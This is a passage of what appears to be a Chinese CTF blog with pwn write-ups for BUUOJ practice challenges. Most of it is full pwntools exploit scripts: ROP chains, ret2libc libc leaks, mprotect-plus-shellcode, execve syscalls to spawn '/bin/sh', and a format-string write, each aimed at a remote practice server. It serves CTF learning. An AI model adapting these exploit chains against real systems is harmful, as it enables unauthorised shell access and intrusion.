class="hljs-number">56</span><br>payload+=p32(get_flag)<br>payload+=p32(exit_addr)<br>payload+=p32(param1)<br>payload+=p32(param2)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25556</span>) <br><br>pop_eax = <span class="hljs-number">0x080b91e6</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806fc30</span><br>int_0x80 = <span class="hljs-number">0x0806d7e5</span><br>bin_sh = <span class="hljs-number">0x80eb050</span><br>mov_edx_eax = <span class="hljs-number">0x080557ab</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">56</span>+p32(pop_eax)+<span class="hljs-string">b&#x27;/bin&#x27;</span>+ p32(pop_edx_ecx_ebx)+p32(bin_sh)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(mov_edx_eax) <span class="hljs-comment"># 写&#x27;/bin&#x27;</span><br>payload+= p32(pop_eax)+<span class="hljs-string">b&#x27;/sh\x00&#x27;</span>+p32(pop_edx_ecx_ebx)+p32(bin_sh+<span class="hljs-number">4</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(mov_edx_eax) <span class="hljs-comment"># 写&#x27;/sh\x00&#x27;</span><br>payload+= p32(pop_eax)+p32(<span class="hljs-number">0xb</span>)+p32(pop_edx_ecx_ebx)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)+p32(int_0x80) <span class="hljs-comment"># 系统调用</span><br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="mprotect-shellcode"><a href="#mprotect-shellcode" class="headerlink" title="mprotect + shellcode"></a>mprotect + shellcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28056</span>)<br><span class="hljs-comment">#p = process(&quot;./get_started_3dsctf_2016&quot;)</span><br><span class="hljs-comment">#context(log_level=&quot;debug&quot;)</span><br><br>param1 = <span class="hljs-number">0x308cd64f</span><br>param2 = <span class="hljs-number">0x195719d1</span><br>get_flag = <span class="hljs-number">0x080489a0</span><br>exit_addr=<span class="hljs-number">0x804e6a0</span><br>mprotect_addr=<span class="hljs-number">0x806ec80</span><br>buf = <span class="hljs-number">0x80ea000</span><br>read_addr=<span class="hljs-number">0x806e140</span><br>pop_3_ret=<span class="hljs-number">0x804f460</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span><br>payload+=p32(mprotect_addr)<br>payload+=p32(pop_3_ret)<br>payload+=p32(buf)<br>payload+=p32(<span class="hljs-number">0x1000</span>)<br>payload+=p32(<span class="hljs-number">0x7</span>)<br>payload+=p32(read_addr)<br>payload+=p32(buf)<br>payload+=p32(<span class="hljs-number">0</span>)<br>payload+=p32(buf)<br>payload+=p32(<span class="hljs-number">0x100</span>)<br><br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(payload)<br>sleep(<span class="hljs-number">0.1</span>)<br><br>shellcode = asm(shellcraft.sh(),arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><p>64位传参</p>
+<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./level2_x64&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25059</span>)<br><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>hint = <span class="hljs-number">0x600a90</span><br>system_addr = <span class="hljs-number">0x400603</span><br>pop_rdi_ret = <span class="hljs-number">0x4006b3</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">128</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdi_ret) + p64(hint) + p64(system_addr)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Input:&quot;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><h3 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h3><p>64位传参</p>
+<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./babyrop&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26483</span>)<br><br>binsh = <span class="hljs-number">0x601048</span><br>pop_rdi = <span class="hljs-number">0x400683</span><br>system_addr = <span class="hljs-number">0x4005E3</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">16</span>+<span class="hljs-number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><h3 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h3><p>ret2libc，利用write泄露地址</p>
+<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29568</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = <span class="hljs-number">0x08048825</span><br><br>write_offset = libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br>system_offset = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_offset = libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()<br><br>payload1 = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">6</span>+<span class="hljs-string">b&#x27;\xFF&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">10</span><br>p.sendline(payload1)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>)<br>payload2 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">235</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">8</span>)<br>p.sendline(payload2)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#info(hex(write_addr))</span><br><br>libc_base = write_addr - write_offset<br>system_addr = libc_base + system_offset<br>binsh = libc_base + binsh_offset <br><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">b&#x27;Correct\n&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">235</span>+p32(system_addr)+p32(main)+p32(binsh)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="others-shellcode"><a href="#others-shellcode" class="headerlink" title="others_shellcode"></a>others_shellcode</h2><h3 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h3><p>直接连接就有shell了</p>
+<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><h3 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h3><p>ret2libc</p>
+<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27559</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_n_5&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_n_5&quot;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>ret = <span class="hljs-number">0x4004c9</span><br>pop_rdi = <span class="hljs-number">0x400713</span><br>main = <span class="hljs-number">0x400636</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;name\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.recvuntil(<span class="hljs-string">b&#x27;me?\n&#x27;</span>)<br>p.sendline(payload)<br><br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#info(hex(puts_addr))</span><br><br>system_addr = puts_addr - <span class="hljs-number">0x31580</span><br>binsh = puts_addr + <span class="hljs-number">0x1334da</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;name\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;AAAA&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">40</span> + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system_addr)<br>p.recvuntil(<span class="hljs-string">b&#x27;me?\n&#x27;</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><h3 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h3><p>利用write输出flag就好了</p>
+<h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27490</span>)<br><span class="hljs-comment">#p = process(&quot;./not_the_same_3dsctf_2016&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./not_the_same_3dsctf_2016&quot;)</span><br><br><span class="hljs-comment">#write_plt = elf.plt[&quot;write&quot;]</span><br>write_plt =<span class="hljs-number">0x0806E270</span><br>get_flag = <span class="hljs-number">0x080489A0</span><br>flag = <span class="hljs-number">0x080ECA2D</span><br>exit_addr = <span class="hljs-number">0x0804E660</span> <br>main = <span class="hljs-number">0x080489E0</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">45</span> + p32(get_flag) + p32(write_plt) + p32(exit_addr) + p32(<span class="hljs-number">1</span>) + p32(flag) + p32(<span class="hljs-number">100</span>)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><h3 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h3><p>和之前第11题相同</p>
+<h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># same as 11</span><br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28455</span>)<br><span class="hljs-comment">#p = process(&#x27;./ciscn_2019_en_2&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_en_2&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>gets_got = elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400c83</span><br>ret = <span class="hljs-number">0x4006b9</span><br>encrypt = <span class="hljs-number">0x4009a0</span><br><br>puts_offset = <span class="hljs-number">0x0809c0</span><br>system_offset = <span class="hljs-number">0x04f440</span><br>binsh_offset = <span class="hljs-number">0x1b3e9a</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your choice!&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Ciphertext&quot;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">8</span>)[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>info(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base + system_offset<br>binsh_addr = libc_base + binsh_offset<br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">87</span><br>payload+= p64(pop_rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h2><h3 id="思路-19"><a href="#思路-19" class="headerlink" title="思路"></a>思路</h3><p>32位传参</p>
+<h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29664</span>)<br><span class="hljs-comment">#p = process(&quot;./ciscn_2019_ne_5&quot;)</span><br><br>system_addr = <span class="hljs-number">0x080484D0</span><br>main = <span class="hljs-number">0x08048722</span><br>binsh = <span class="hljs-number">0x080482ea</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">overflow</span>(<span class="hljs-params">payload</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;password&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;operation&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;info&#x27;</span>)<br>    p.sendline(payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;operation&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">76</span> + p32(system_addr) + p32(main) + p32(binsh)<br><br>overflow(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h3 id="思路-20"><a href="#思路-20" class="headerlink" title="思路"></a>思路</h3><p>ret2libc</p>
+<h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">28035</span>)<br><span class="hljs-comment">#p = process(&quot;./2018_rop&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./2018_rop&quot;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x080484C6</span><br><br>payload1 = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">140</span> + p32(write_plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendline(payload1)<br>p.recv(<span class="hljs-number">4</span>)<br>p.sendline(payload1)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>info(<span class="hljs-built_in">hex</span>(write_addr))<br><br>system_addr = write_addr - <span class="hljs-number">0xa89e0</span><br>binsh = write_addr + <span class="hljs-number">0x961df</span><br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">140</span>+p32(system_addr) + p32(main) + p32(binsh)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><h3 id="思路-21"><a href="#思路-21" class="headerlink" title="思路"></a>思路</h3><p>有个有符号整数与无符号整数的转换漏洞</p>
+<h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25144</span>)<br><span class="hljs-comment">#p = process(&quot;./bjdctf_2020_babystack2&quot;)</span><br><br>backdoor = <span class="hljs-number">0x400726</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;name:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">16</span>+<span class="hljs-number">8</span>) + p64(backdoor) <br>p.recvuntil(<span class="hljs-string">b&quot;name?&quot;</span>)<br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="思路-22"><a href="#思路-22" class="headerlink" title="思路"></a>思路</h3><p>格式化字符串漏洞</p>
+<h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = process(&quot;./fm&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29687</span>)<br>x_addr = <span class="hljs-number">0x0804A02C</span><br><br>payload = p32(x_addr) + <span class="hljs-string">b&#x27;%11$n&#x27;</span><br><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><h3 id="思路-23"><a href="#思路-23" class="headerlink" title="思路"></a>思路</h3><p>栈迁移<br>利用第一次输出泄露调用vuln函数时压入的ebp，即main_ebp<br>构造 <code>b&#39;AAAA&#39; + p32(system_plt) + p32(main) + p32(main_ebp-offset) + b&#39;/bin/sh&#39;</code><br>调试获取main_ebp与’&#x2F;bin&#x2F;sh’的偏移offset<br>最后利用两次leave_ret转移esp，第一次是程序中的leave，用于转移ebp;第二次是leave_ret的gadget，这次会转移esp</p>
